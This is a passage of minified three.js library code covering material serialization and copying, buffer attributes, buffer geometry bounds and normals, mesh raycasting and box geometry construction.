this.metalnessMap&&this.metalnessMap.isTexture&&(i.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(i.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(i.specularMap=this.specularMap.toJSON(e).uuid),this.specularIntensityMap&&this.specularIntensityMap.isTexture&&(i.specularIntensityMap=this.specularIntensityMap.toJSON(e).uuid),this.specularColorMap&&this.specularColorMap.isTexture&&(i.specularColorMap=this.specularColorMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(i.envMap=this.envMap.toJSON(e).uuid,this.combine!==void 0&&(i.combine=this.combine)),this.envMapRotation!==void 0&&(i.envMapRotation=this.envMapRotation.toArray()),this.envMapIntensity!==void 0&&(i.envMapIntensity=this.envMapIntensity),this.reflectivity!==void 0&&(i.reflectivity=this.reflectivity),this.refractionRatio!==void 0&&(i.refractionRatio=this.refractionRatio),this.gradientMap&&this.gradientMap.isTexture&&(i.gradientMap=this.gradientMap.toJSON(e).uuid),this.transmission!==void 0&&(i.transmission=this.transmission),this.transmissionMap&&this.transmissionMap.isTexture&&(i.transmissionMap=this.transmissionMap.toJSON(e).uuid),this.thickness!==void 0&&(i.thickness=this.thickness),this.thicknessMap&&this.thicknessMap.isTexture&&(i.thicknessMap=this.thicknessMap.toJSON(e).uuid),this.attenuationDistance!==void 0&&this.attenuationDistance!==1/0&&(i.attenuationDistance=this.attenuationDistance),this.attenuationColor!==void 0&&(i.attenuationColor=this.attenuationColor.getHex()),this.size!==void 0&&(i.size=this.size),this.shadowSide!==null&&(i.shadowSide=this.shadowSide),this.sizeAttenuation!==void 0&&(i.sizeAttenuation=this.sizeAttenuation),this.blending!==Er&&(i.blending=this.blending),this.side!==cs&&(i.side=this.side),this.vertexColors===!0&&(i.vertexColors=!0),this.opacity<1&&(i.opacity=this.opacity),this.transparent===!0&&(i.transparent=!0),this.blendSrc!==md&&(i.blendSrc=this.blendSrc),this.blendDst!==gd&&(i.blendDst=this.blendDst),this.blendEquation!==Es&&(i.blendEquation=this.blendEquation),this.blendSrcAlpha!==null&&(i.blendSrcAlpha=this.blendSrcAlpha),this.blendDstAlpha!==null&&(i.blendDstAlpha=this.blendDstAlpha),this.blendEquationAlpha!==null&&(i.blendEquationAlpha=this.blendEquationAlpha),this.blendColor&&this.blendColor.isColor&&(i.blendColor=this.blendColor.getHex()),this.blendAlpha!==0&&(i.blendAlpha=this.blendAlpha),this.depthFunc!==Dr&&(i.depthFunc=this.depthFunc),this.depthTest===!1&&(i.depthTest=this.depthTest),this.depthWrite===!1&&(i.depthWrite=this.depthWrite),this.colorWrite===!1&&(i.colorWrite=this.colorWrite),this.stencilWriteMask!==255&&(i.stencilWriteMask=this.stencilWriteMask),this.stencilFunc!==Qf&&(i.stencilFunc=this.stencilFunc),this.stencilRef!==0&&(i.stencilRef=this.stencilRef),this.stencilFuncMask!==255&&(i.stencilFuncMask=this.stencilFuncMask),this.stencilFail!==Xs&&(i.stencilFail=this.stencilFail),this.stencilZFail!==Xs&&(i.stencilZFail=this.stencilZFail),this.stencilZPass!==Xs&&(i.stencilZPass=this.stencilZPass),this.stencilWrite===!0&&(i.stencilWrite=this.stencilWrite),this.rotation!==void 0&&this.rotation!==0&&(i.rotation=this.rotation),this.polygonOffset===!0&&(i.polygonOffset=!0),this.polygonOffsetFactor!==0&&(i.polygonOffsetFactor=this.polygonOffsetFactor),this.polygonOffsetUnits!==0&&(i.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth!==void 0&&this.linewidth!==1&&(i.linewidth=this.linewidth),this.dashSize!==void 0&&(i.dashSize=this.dashSize),this.gapSize!==void 0&&(i.gapSize=this.gapSize),this.scale!==void 0&&(i.scale=this.scale),this.dithering===!0&&(i.dithering=!0),this.alphaTest>0&&(i.alphaTest=this.alphaTest),this.alphaHash===!0&&(i.alphaHash=!0),this.alphaToCoverage===!0&&(i.alphaToCoverage=!0),this.premultipliedAlpha===!0&&(i.premultipliedAlpha=!0),this.forceSinglePass===!0&&(i.forceSinglePass=!0),this.allowOverride===!1&&(i.allowOverride=!1),this.wireframe===!0&&(i.wireframe=!0),this.wireframeLinewidth>1&&(i.wireframeLinewidth=this.wireframeLinewidth),this.wireframeLinecap!=="round"&&(i.wireframeLinecap=this.wireframeLinecap),this.wireframeLinejoin!=="round"&&(i.wireframeLinejoin=this.wireframeLinejoin),this.flatShading===!0&&(i.flatShading=!0),this.visible===!1&&(i.visible=!1),this.toneMapped===!1&&(i.toneMapped=!1),this.fog===!1&&(i.fog=!1),Object.keys(this.userData).length>0&&(i.userData=this.userData);function s(r){const a=[];for(const o in r){const l=r[o];delete l.metadata,a.push(l)}return a}if(n){const r=s(e.textures),a=s(e.images);r.length>0&&(i.textures=r),a.length>0&&(i.images=a)}return i}clone(){return new this.constructor().copy(this)}copy(e){this.name=e.name,this.blending=e.blending,this.side=e.side,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.blendColor.copy(e.blendColor),this.blendAlpha=e.blendAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.stencilWrite=e.stencilWrite;const n=e.clippingPlanes;let i=null;if(n!==null){const s=n.length;i=new Array(s);for(let r=0;r!==s;++r)i[r]=n[r].clone()}return this.clippingPlanes=i,this.clipIntersection=e.clipIntersection,this.clipShadows=e.clipShadows,this.shadowSide=e.shadowSide,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.alphaHash=e.alphaHash,this.alphaToCoverage=e.alphaToCoverage,this.premultipliedAlpha=e.premultipliedAlpha,this.forceSinglePass=e.forceSinglePass,this.allowOverride=e.allowOverride,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this}dispose(){this.dispatchEvent({type:"dispose"})}set needsUpdate(e){e===!0&&this.version++}}class mh extends Wr{constructor(e){super(),this.isMeshBasicMaterial=!0,this.type="MeshBasicMaterial",this.color=new Ie(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.envMapRotation=new ci,this.combine=R0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapRotation.copy(e.envMapRotation),this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.fog=e.fog,this}}const At=new B,Uo=new et;let Dw=0;class oi{constructor(e,n,i=!1){if(Array.isArray(e))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.isBufferAttribute=!0,Object.defineProperty(this,"id",{value:Dw++}),this.name="",this.array=e,this.itemSize=n,this.count=e!==void 0?e.length/n:0,this.normalized=i,this.usage=em,this.updateRanges=[],this.gpuType=ti,this.version=0}onUploadCallback(){}set needsUpdate(e){e===!0&&this.version++}setUsage(e){return this.usage=e,this}addUpdateRange(e,n){this.updateRanges.push({start:e,count:n})}clearUpdateRanges(){this.updateRanges.length=0}copy(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this.gpuType=e.gpuType,this}copyAt(e,n,i){e*=this.itemSize,i*=n.itemSize;for(let s=0,r=this.itemSize;s<r;s++)this.array[e+s]=n.array[i+s];return this}copyArray(e){return this.array.set(e),this}applyMatrix3(e){if(this.itemSize===2)for(let n=0,i=this.count;n<i;n++)Uo.fromBufferAttribute(this,n),Uo.applyMatrix3(e),this.setXY(n,Uo.x,Uo.y);else if(this.itemSize===3)for(let n=0,i=this.count;n<i;n++)At.fromBufferAttribute(this,n),At.applyMatrix3(e),this.setXYZ(n,At.x,At.y,At.z);return this}applyMatrix4(e){for(let n=0,i=this.count;n<i;n++)At.fromBufferAttribute(this,n),At.applyMatrix4(e),this.setXYZ(n,At.x,At.y,At.z);return this}applyNormalMatrix(e){for(let n=0,i=this.count;n<i;n++)At.fromBufferAttribute(this,n),At.applyNormalMatrix(e),this.setXYZ(n,At.x,At.y,At.z);return this}transformDirection(e){for(let n=0,i=this.count;n<i;n++)At.fromBufferAttribute(this,n),At.transformDirection(e),this.setXYZ(n,At.x,At.y,At.z);return this}set(e,n=0){return this.array.set(e,n),this}getComponent(e,n){let i=this.array[e*this.itemSize+n];return this.normalized&&(i=ta(i,this.array)),i}setComponent(e,n,i){return this.normalized&&(i=ln(i,this.array)),this.array[e*this.itemSize+n]=i,this}getX(e){let n=this.array[e*this.itemSize];return this.normalized&&(n=ta(n,this.array)),n}setX(e,n){return this.normalized&&(n=ln(n,this.array)),this.array[e*this.itemSize]=n,this}getY(e){let n=this.array[e*this.itemSize+1];return this.normalized&&(n=ta(n,this.array)),n}setY(e,n){return this.normalized&&(n=ln(n,this.array)),this.array[e*this.itemSize+1]=n,this}getZ(e){let n=this.array[e*this.itemSize+2];return this.normalized&&(n=ta(n,this.array)),n}setZ(e,n){return this.normalized&&(n=ln(n,this.array)),this.array[e*this.itemSize+2]=n,this}getW(e){let n=this.array[e*this.itemSize+3];return this.normalized&&(n=ta(n,this.array)),n}setW(e,n){return this.normalized&&(n=ln(n,this.array)),this.array[e*this.itemSize+3]=n,this}setXY(e,n,i){return e*=this.itemSize,this.normalized&&(n=ln(n,this.array),i=ln(i,this.array)),this.array[e+0]=n,this.array[e+1]=i,this}setXYZ(e,n,i,s){return e*=this.itemSize,this.normalized&&(n=ln(n,this.array),i=ln(i,this.array),s=ln(s,this.array)),this.array[e+0]=n,this.array[e+1]=i,this.array[e+2]=s,this}setXYZW(e,n,i,s,r){return e*=this.itemSize,this.normalized&&(n=ln(n,this.array),i=ln(i,this.array),s=ln(s,this.array),r=ln(r,this.array)),this.array[e+0]=n,this.array[e+1]=i,this.array[e+2]=s,this.array[e+3]=r,this}onUpload(e){return this.onUploadCallback=e,this}clone(){return new this.constructor(this.array,this.itemSize).copy(this)}toJSON(){const e={itemSize:this.itemSize,type:this.array.constructor.name,array:Array.from(this.array),normalized:this.normalized};return this.name!==""&&(e.name=this.name),this.usage!==em&&(e.usage=this.usage),e}}class Z0 extends oi{constructor(e,n,i){super(new Uint16Array(e),n,i)}}class J0 extends oi{constructor(e,n,i){super(new Uint32Array(e),n,i)}}class kt extends oi{constructor(e,n,i){super(new Float32Array(e),n,i)}}let Iw=0;const Rn=new _t,ou=new Gt,nr=new B,xn=new ro,ra=new ro,It=new B;class An extends Gr{constructor(){super(),this.isBufferGeometry=!0,Object.defineProperty(this,"id",{value:Iw++}),this.uuid=io(),this.name="",this.type="BufferGeometry",this.index=null,this.indirect=null,this.indirectOffset=0,this.attributes={},this.morphAttributes={},this.morphTargetsRelative=!1,this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}getIndex(){return this.index}setIndex(e){return Array.isArray(e)?this.index=new(X0(e)?J0:Z0)(e,1):this.index=e,this}setIndirect(e,n=0){return this.indirect=e,this.indirectOffset=n,this}getIndirect(){return this.indirect}getAttribute(e){return this.attributes[e]}setAttribute(e,n){return this.attributes[e]=n,this}deleteAttribute(e){return delete this.attributes[e],this}hasAttribute(e){return this.attributes[e]!==void 0}addGroup(e,n,i=0){this.groups.push({start:e,count:n,materialIndex:i})}clearGroups(){this.groups=[]}setDrawRange(e,n){this.drawRange.start=e,this.drawRange.count=n}applyMatrix4(e){const n=this.attributes.position;n!==void 0&&(n.applyMatrix4(e),n.needsUpdate=!0);const i=this.attributes.normal;if(i!==void 0){const r=new Fe().getNormalMatrix(e);i.applyNormalMatrix(r),i.needsUpdate=!0}const s=this.attributes.tangent;return s!==void 0&&(s.transformDirection(e),s.needsUpdate=!0),this.boundingBox!==null&&this.computeBoundingBox(),this.boundingSphere!==null&&this.computeBoundingSphere(),this}applyQuaternion(e){return Rn.makeRotationFromQuaternion(e),this.applyMatrix4(Rn),this}rotateX(e){return Rn.makeRotationX(e),this.applyMatrix4(Rn),this}rotateY(e){return Rn.makeRotationY(e),this.applyMatrix4(Rn),this}rotateZ(e){return Rn.makeRotationZ(e),this.applyMatrix4(Rn),this}translate(e,n,i){return Rn.makeTranslation(e,n,i),this.applyMatrix4(Rn),this}scale(e,n,i){return Rn.makeScale(e,n,i),this.applyMatrix4(Rn),this}lookAt(e){return ou.lookAt(e),ou.updateMatrix(),this.applyMatrix4(ou.matrix),this}center(){return this.computeBoundingBox(),this.boundingBox.getCenter(nr).negate(),this.translate(nr.x,nr.y,nr.z),this}setFromPoints(e){const n=this.getAttribute("position");if(n===void 0){const i=[];for(let s=0,r=e.length;s<r;s++){const a=e[s];i.push(a.x,a.y,a.z||0)}this.setAttribute("position",new kt(i,3))}else{const i=Math.min(e.length,n.count);for(let s=0;s<i;s++){const r=e[s];n.setXYZ(s,r.x,r.y,r.z||0)}e.length>n.count&&Ne("BufferGeometry: Buffer size too small for points data. Use .dispose() and create a new geometry."),n.needsUpdate=!0}return this}computeBoundingBox(){this.boundingBox===null&&(this.boundingBox=new ro);const e=this.attributes.position,n=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){Qe("BufferGeometry.computeBoundingBox(): GLBufferAttribute requires a manual bounding box.",this),this.boundingBox.set(new B(-1/0,-1/0,-1/0),new B(1/0,1/0,1/0));return}if(e!==void 0){if(this.boundingBox.setFromBufferAttribute(e),n)for(let i=0,s=n.length;i<s;i++){const r=n[i];xn.setFromBufferAttribute(r),this.morphTargetsRelative?(It.addVectors(this.boundingBox.min,xn.min),this.boundingBox.expandByPoint(It),It.addVectors(this.boundingBox.max,xn.max),this.boundingBox.expandByPoint(It)):(this.boundingBox.expandByPoint(xn.min),this.boundingBox.expandByPoint(xn.max))}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&Qe('BufferGeometry.computeBoundingBox(): Computed min/max have NaN values. The "position" attribute is likely to have NaN values.',this)}computeBoundingSphere(){this.boundingSphere===null&&(this.boundingSphere=new oc);const e=this.attributes.position,n=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){Qe("BufferGeometry.computeBoundingSphere(): GLBufferAttribute requires a manual bounding sphere.",this),this.boundingSphere.set(new B,1/0);return}if(e){const i=this.boundingSphere.center;if(xn.setFromBufferAttribute(e),n)for(let r=0,a=n.length;r<a;r++){const o=n[r];ra.setFromBufferAttribute(o),this.morphTargetsRelative?(It.addVectors(xn.min,ra.min),xn.expandByPoint(It),It.addVectors(xn.max,ra.max),xn.expandByPoint(It)):(xn.expandByPoint(ra.min),xn.expandByPoint(ra.max))}xn.getCenter(i);let s=0;for(let r=0,a=e.count;r<a;r++)It.fromBufferAttribute(e,r),s=Math.max(s,i.distanceToSquared(It));if(n)for(let r=0,a=n.length;r<a;r++){const o=n[r],l=this.morphTargetsRelative;for(let c=0,d=o.count;c<d;c++)It.fromBufferAttribute(o,c),l&&(nr.fromBufferAttribute(e,c),It.add(nr)),s=Math.max(s,i.distanceToSquared(It))}this.boundingSphere.radius=Math.sqrt(s),isNaN(this.boundingSphere.radius)&&Qe('BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}}computeTangents(){const e=this.index,n=this.attributes;if(e===null||n.position===void 0||n.normal===void 0||n.uv===void 0){Qe("BufferGeometry: .computeTangents() failed. Missing required attributes (index, position, normal or uv)");return}const i=n.position,s=n.normal,r=n.uv;this.hasAttribute("tangent")===!1&&this.setAttribute("tangent",new oi(new Float32Array(4*i.count),4));const a=this.getAttribute("tangent"),o=[],l=[];for(let N=0;N<i.count;N++)o[N]=new B,l[N]=new B;const c=new B,d=new B,p=new B,h=new et,f=new et,_=new et,y=new B,m=new B;function u(N,b,w){c.fromBufferAttribute(i,N),d.fromBufferAttribute(i,b),p.fromBufferAttribute(i,w),h.fromBufferAttribute(r,N),f.fromBufferAttribute(r,b),_.fromBufferAttribute(r,w),d.sub(c),p.sub(c),f.sub(h),_.sub(h);const P=1/(f.x*_.y-_.x*f.y);isFinite(P)&&(y.copy(d).multiplyScalar(_.y).addScaledVector(p,-f.y).multiplyScalar(P),m.copy(p).multiplyScalar(f.x).addScaledVector(d,-_.x).multiplyScalar(P),o[N].add(y),o[b].add(y),o[w].add(y),l[N].add(m),l[b].add(m),l[w].add(m))}let g=this.groups;g.length===0&&(g=[{start:0,count:e.count}]);for(let N=0,b=g.length;N<b;++N){const w=g[N],P=w.start,z=w.count;for(let V=P,Z=P+z;V<Z;V+=3)u(e.getX(V+0),e.getX(V+1),e.getX(V+2))}const x=new B,S=new B,T=new B,A=new B;function R(N){T.fromBufferAttribute(s,N),A.copy(T);const b=o[N];x.copy(b),x.sub(T.multiplyScalar(T.dot(b))).normalize(),S.crossVectors(A,b);const P=S.dot(l[N])<0?-1:1;a.setXYZW(N,x.x,x.y,x.z,P)}for(let N=0,b=g.length;N<b;++N){const w=g[N],P=w.start,z=w.count;for(let V=P,Z=P+z;V<Z;V+=3)R(e.getX(V+0)),R(e.getX(V+1)),R(e.getX(V+2))}}computeVertexNormals(){const e=this.index,n=this.getAttribute("position");if(n!==void 0){let i=this.getAttribute("normal");if(i===void 0)i=new oi(new Float32Array(n.count*3),3),this.setAttribute("normal",i);else for(let h=0,f=i.count;h<f;h++)i.setXYZ(h,0,0,0);const s=new B,r=new B,a=new B,o=new B,l=new B,c=new B,d=new B,p=new B;if(e)for(let h=0,f=e.count;h<f;h+=3){const _=e.getX(h+0),y=e.getX(h+1),m=e.getX(h+2);s.fromBufferAttribute(n,_),r.fromBufferAttribute(n,y),a.fromBufferAttribute(n,m),d.subVectors(a,r),p.subVectors(s,r),d.cross(p),o.fromBufferAttribute(i,_),l.fromBufferAttribute(i,y),c.fromBufferAttribute(i,m),o.add(d),l.add(d),c.add(d),i.setXYZ(_,o.x,o.y,o.z),i.setXYZ(y,l.x,l.y,l.z),i.setXYZ(m,c.x,c.y,c.z)}else for(let h=0,f=n.count;h<f;h+=3)s.fromBufferAttribute(n,h+0),r.fromBufferAttribute(n,h+1),a.fromBufferAttribute(n,h+2),d.subVectors(a,r),p.subVectors(s,r),d.cross(p),i.setXYZ(h+0,d.x,d.y,d.z),i.setXYZ(h+1,d.x,d.y,d.z),i.setXYZ(h+2,d.x,d.y,d.z);this.normalizeNormals(),i.needsUpdate=!0}}normalizeNormals(){const e=this.attributes.normal;for(let n=0,i=e.count;n<i;n++)It.fromBufferAttribute(e,n),It.normalize(),e.setXYZ(n,It.x,It.y,It.z)}toNonIndexed(){function e(o,l){const c=o.array,d=o.itemSize,p=o.normalized,h=new c.constructor(l.length*d);let f=0,_=0;for(let y=0,m=l.length;y<m;y++){o.isInterleavedBufferAttribute?f=l[y]*o.data.stride+o.offset:f=l[y]*d;for(let u=0;u<d;u++)h[_++]=c[f++]}return new oi(h,d,p)}if(this.index===null)return Ne("BufferGeometry.toNonIndexed(): BufferGeometry is already non-indexed."),this;const n=new An,i=this.index.array,s=this.attributes;for(const o in s){const l=s[o],c=e(l,i);n.setAttribute(o,c)}const r=this.morphAttributes;for(const o in r){const l=[],c=r[o];for(let d=0,p=c.length;d<p;d++){const h=c[d],f=e(h,i);l.push(f)}n.morphAttributes[o]=l}n.morphTargetsRelative=this.morphTargetsRelative;const a=this.groups;for(let o=0,l=a.length;o<l;o++){const c=a[o];n.addGroup(c.start,c.count,c.materialIndex)}return n}toJSON(){const e={metadata:{version:4.7,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,this.name!==""&&(e.name=this.name),Object.keys(this.userData).length>0&&(e.userData=this.userData),this.parameters!==void 0){const l=this.parameters;for(const c in l)l[c]!==void 0&&(e[c]=l[c]);return e}e.data={attributes:{}};const n=this.index;n!==null&&(e.data.index={type:n.array.constructor.name,array:Array.prototype.slice.call(n.array)});const i=this.attributes;for(const l in i){const c=i[l];e.data.attributes[l]=c.toJSON(e.data)}const s={};let r=!1;for(const l in this.morphAttributes){const c=this.morphAttributes[l],d=[];for(let p=0,h=c.length;p<h;p++){const f=c[p];d.push(f.toJSON(e.data))}d.length>0&&(s[l]=d,r=!0)}r&&(e.data.morphAttributes=s,e.data.morphTargetsRelative=this.morphTargetsRelative);const a=this.groups;a.length>0&&(e.data.groups=JSON.parse(JSON.stringify(a)));const o=this.boundingSphere;return o!==null&&(e.data.boundingSphere=o.toJSON()),e}clone(){return new this.constructor().copy(this)}copy(e){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;const n={};this.name=e.name;const i=e.index;i!==null&&this.setIndex(i.clone());const s=e.attributes;for(const c in s){const d=s[c];this.setAttribute(c,d.clone(n))}const r=e.morphAttributes;for(const c in r){const d=[],p=r[c];for(let h=0,f=p.length;h<f;h++)d.push(p[h].clone(n));this.morphAttributes[c]=d}this.morphTargetsRelative=e.morphTargetsRelative;const a=e.groups;for(let c=0,d=a.length;c<d;c++){const p=a[c];this.addGroup(p.start,p.count,p.materialIndex)}const o=e.boundingBox;o!==null&&(this.boundingBox=o.clone());const l=e.boundingSphere;return l!==null&&(this.boundingSphere=l.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,this}dispose(){this.dispatchEvent({type:"dispose"})}}const mm=new _t,_s=new Y0,Oo=new oc,gm=new B,Fo=new B,Bo=new B,zo=new B,lu=new B,Vo=new B,vm=new B,Ho=new B;class Ot extends Gt{constructor(e=new An,n=new mh){super(),this.isMesh=!0,this.type="Mesh",this.geometry=e,this.material=n,this.morphTargetDictionary=void 0,this.morphTargetInfluences=void 0,this.count=1,this.updateMorphTargets()}copy(e,n){return super.copy(e,n),e.morphTargetInfluences!==void 0&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),e.morphTargetDictionary!==void 0&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}updateMorphTargets(){const n=this.geometry.morphAttributes,i=Object.keys(n);if(i.length>0){const s=n[i[0]];if(s!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let r=0,a=s.length;r<a;r++){const o=s[r].name||String(r);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=r}}}}getVertexPosition(e,n){const i=this.geometry,s=i.attributes.position,r=i.morphAttributes.position,a=i.morphTargetsRelative;n.fromBufferAttribute(s,e);const o=this.morphTargetInfluences;if(r&&o){Vo.set(0,0,0);for(let l=0,c=r.length;l<c;l++){const d=o[l],p=r[l];d!==0&&(lu.fromBufferAttribute(p,e),a?Vo.addScaledVector(lu,d):Vo.addScaledVector(lu.sub(n),d))}n.add(Vo)}return n}raycast(e,n){const i=this.geometry,s=this.material,r=this.matrixWorld;s!==void 0&&(i.boundingSphere===null&&i.computeBoundingSphere(),Oo.copy(i.boundingSphere),Oo.applyMatrix4(r),_s.copy(e.ray).recast(e.near),!(Oo.containsPoint(_s.origin)===!1&&(_s.intersectSphere(Oo,gm)===null||_s.origin.distanceToSquared(gm)>(e.far-e.near)**2))&&(mm.copy(r).invert(),_s.copy(e.ray).applyMatrix4(mm),!(i.boundingBox!==null&&_s.intersectsBox(i.boundingBox)===!1)&&this._computeIntersections(e,n,_s)))}_computeIntersections(e,n,i){let s;const r=this.geometry,a=this.material,o=r.index,l=r.attributes.position,c=r.attributes.uv,d=r.attributes.uv1,p=r.attributes.normal,h=r.groups,f=r.drawRange;if(o!==null)if(Array.isArray(a))for(let _=0,y=h.length;_<y;_++){const m=h[_],u=a[m.materialIndex],g=Math.max(m.start,f.start),x=Math.min(o.count,Math.min(m.start+m.count,f.start+f.count));for(let S=g,T=x;S<T;S+=3){const A=o.getX(S),R=o.getX(S+1),N=o.getX(S+2);s=Go(this,u,e,i,c,d,p,A,R,N),s&&(s.faceIndex=Math.floor(S/3),s.face.materialIndex=m.materialIndex,n.push(s))}}else{const _=Math.max(0,f.start),y=Math.min(o.count,f.start+f.count);for(let m=_,u=y;m<u;m+=3){const g=o.getX(m),x=o.getX(m+1),S=o.getX(m+2);s=Go(this,a,e,i,c,d,p,g,x,S),s&&(s.faceIndex=Math.floor(m/3),n.push(s))}}else if(l!==void 0)if(Array.isArray(a))for(let _=0,y=h.length;_<y;_++){const m=h[_],u=a[m.materialIndex],g=Math.max(m.start,f.start),x=Math.min(l.count,Math.min(m.start+m.count,f.start+f.count));for(let S=g,T=x;S<T;S+=3){const A=S,R=S+1,N=S+2;s=Go(this,u,e,i,c,d,p,A,R,N),s&&(s.faceIndex=Math.floor(S/3),s.face.materialIndex=m.materialIndex,n.push(s))}}else{const _=Math.max(0,f.start),y=Math.min(l.count,f.start+f.count);for(let m=_,u=y;m<u;m+=3){const g=m,x=m+1,S=m+2;s=Go(this,a,e,i,c,d,p,g,x,S),s&&(s.faceIndex=Math.floor(m/3),n.push(s))}}}}function Uw(t,e,n,i,s,r,a,o){let l;if(e.side===mn?l=i.intersectTriangle(a,r,s,!0,o):l=i.intersectTriangle(s,r,a,e.side===cs,o),l===null)return null;Ho.copy(o),Ho.applyMatrix4(t.matrixWorld);const c=n.ray.origin.distanceTo(Ho);return c<n.near||c>n.far?null:{distance:c,point:Ho.clone(),object:t}}function Go(t,e,n,i,s,r,a,o,l,c){t.getVertexPosition(o,Fo),t.getVertexPosition(l,Bo),t.getVertexPosition(c,zo);const d=Uw(t,e,n,i,Fo,Bo,zo,vm);if(d){const p=new B;Wn.getBarycoord(vm,Fo,Bo,zo,p),s&&(d.uv=Wn.getInterpolatedAttribute(s,o,l,c,p,new et)),r&&(d.uv1=Wn.getInterpolatedAttribute(r,o,l,c,p,new et)),a&&(d.normal=Wn.getInterpolatedAttribute(a,o,l,c,p,new B),d.normal.dot(i.direction)>0&&d.normal.multiplyScalar(-1));const h={a:o,b:l,c,normal:new B,materialIndex:0};Wn.getNormal(Fo,Bo,zo,h.normal),d.face=h,d.barycoord=p}return d}class wi extends An{constructor(e=1,n=1,i=1,s=1,r=1,a=1){super(),this.type="BoxGeometry",this.parameters={width:e,height:n,depth:i,widthSegments:s,heightSegments:r,depthSegments:a};const o=this;s=Math.floor(s),r=Math.floor(r),a=Math.floor(a);const l=[],c=[],d=[],p=[];let h=0,f=0;_("z","y","x",-1,-1,i,n,e,a,r,0),_("z","y","x",1,-1,i,n,-e,a,r,1),_("x","z","y",1,1,e,i,n,s,a,2),_("x","z","y",1,-1,e,i,-n,s,a,3),_("x","y","z",1,-1,e,n,i,s,r,4),_("x","y","z",-1,-1,e,n,-i,s,r,5),this.setIndex(l),this.setAttribute("position",new kt(c,3)),this.setAttribute("normal",new kt(d,3)),this.setAttribute("uv",new kt(p,2));function _(y,m,u,g,x,S,T,A,R,N,b){const w=S/R,P=T/N,z=S/2,V=T/2,Z=A/2,$=R+1,X=N+1;let H=0,I=0;const J=new B;for(let K=0;K<X;K++){const ne=K*P-V;for(let we=0;we<$;we++){const Pe=we*w-z;J[y]=Pe*g,J[m]=ne*x,J[u]=Z,c.push(J.x,J.y,J.z),J[y]=0,J[m]=0,J[u]=A>0?1:-1,d.push(J.x,J.y,J.z),p.push(we/R),p.push(1-K/N),H+=1}}for(let K=0;K<N;K++)for(let ne=0;ne<R;ne++){const we=h+ne+$*K,Pe=h+ne+$*(K+1),Ge=h+(ne+1)+$*(K+1),Ke=h+(ne+1)+$*K;l.push(we,Pe,Ke),l.push(Pe,Ge,Ke),I+=6}o.addGroup(f,I,b),f+=I,h+=H}}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new wi(e.width,e.height,e.depth,e.widthSegments,e.heightSegments,e.depthSegments)}}function Fr(t){const e={};for(const n in t){e[n]={};for(const i in t[n]){const s=t[n][i];s&&(s.isColor||s.isMatrix3||s.isMatrix4||s.isVector2||s.isVector3||s.isVector4||s.isTexture||s.isQuaternion)?s.isRenderTargetTexture?(Ne("UniformsUtils: Textures of render targets cannot be cloned via cloneUniforms() or mergeUniforms()."),e[n][i]=null):e[n][i]=s.clone():Array.isArray(s)?e[n][i]=s.slice():e[n][i]=s}}return e}function en(t){const e={};for(let n=0;n<t.length;n++){const i=Fr(t[n]);for(const s in i)e[s]=i[s]}return e}function Ow(t){const e=[];for(let n=0;n<t.length;n++)e.push(t[n].clone());return e}function Q0(t){const e=t.getRenderTarget();return e===null?t.outputColorSpace:e.isXRRenderTarget===!0?e.texture.colorSpace:Ye.workingColorSpace}const 